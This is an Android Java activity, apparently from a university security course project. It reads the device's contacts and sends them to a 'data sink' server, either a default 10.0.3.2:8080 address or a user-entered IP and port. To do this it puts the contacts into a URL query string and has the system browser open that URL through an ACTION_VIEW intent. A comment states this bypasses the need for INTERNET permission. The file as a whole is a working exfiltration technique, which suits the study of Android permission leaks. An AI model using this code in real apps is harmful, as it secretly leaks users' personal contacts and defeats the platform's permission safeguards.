package sg.com.ntu.cz4062.group9.contact;

import sg.com.ntu.cz4062.group9.contact.task.GetContactsTask;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;

public class MyContacts extends Activity {
	public static final String TITLE = "~~ Contacts ~~";

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		this.getActionBar().setTitle(TITLE);
		
		/*
		 * pop up the soft keyboard when user is typing
		 */
		EditText temp = (EditText) this.findViewById(R.id.etIp);
		InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
		imm.showSoftInput(temp, InputMethodManager.SHOW_IMPLICIT);
	}
	
	/*
	 * Each time the Activity is resumed, 
	 * the GetContactsTask will be executed once
	 * to retrieve the contacts and upate UI
	 */
	@Override
	protected void onResume() {		
		super.onResume();
		new GetContactsTask(this).execute();
	}

	/*
	 * When the "send contacts" button is pressed,
	 * this.sendContacts() will be invoked.
	 * It will collect the ip and port from the EditText field,
	 * and the contacts in string from the GetContactsTask.
	 * Then it will make a Uri string containing the data sink address
	 * and the contacts data in the format of HTTP GET.
	 * Finally, it fire an intent with action string "Intent.ACTION_VIEW" and Uri.
	 * The system build-in browser will receive the intent and open the Uri.
	 * In this way, the contact can be sent to data sink without INTERNET permission.
	 */
	public void sendContacts(View view) {
		String ip = ((EditText) this.findViewById(R.id.etIp)).getText()
				.toString();
		String port = ((EditText) this.findViewById(R.id.etPort)).getText()
				.toString();
		
		String addr = "http://10.0.3.2:8080/";
		if (!ip.equals("") && !port.equals(""))
			addr = "http://" + ip + ":" + port + "/";

		Uri uri = Uri.parse(addr + "index.php?" + GetContactsTask.pairString);
		startActivity(new Intent(Intent.ACTION_VIEW, uri));
	}
}